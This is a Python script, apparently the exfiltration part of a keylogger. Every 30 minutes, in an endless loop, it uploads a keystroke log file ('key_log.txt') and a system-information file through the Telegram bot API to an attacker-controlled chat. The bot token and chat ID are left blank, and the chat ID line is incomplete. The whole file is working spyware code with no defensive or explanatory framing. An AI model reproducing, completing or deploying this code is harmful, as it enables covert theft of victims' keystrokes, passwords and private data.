import os
import sys
import requests
import time

BOT_TOKEN = ""
CHAT_ID =


def get_base_dir():
    if getattr(sys, "frozen", False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

base_dir = get_base_dir()
key_info = os.path.join(base_dir, "key_log.txt")
sys_info = os.path.join(base_dir, "sys_info.txt")


def ensure_file_exists(path):
    if not os.path.exists(path):
        open(path, "a").close()


def send_file(file_path, caption=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        payload = {"chat_id": CHAT_ID, "caption": caption}
        files = {"document": f}
        response = requests.post(url, data=payload, files=files)
    
    if response.status_code == 200:
        print(f"Sent: {file_path}")
    else:
        print(f"Failed: {response.text}")

def send_files():
    ensure_file_exists(key_info)
    ensure_file_exists(sys_info)
    send_file(key_info, caption="File 1")
    send_file(sys_info, caption="File 2")

if __name__ == "__main__":
    while True:
        print("Sending files...")
        send_files()
        print("Waiting 30 minutes...")
        time.sleep(30 * 60)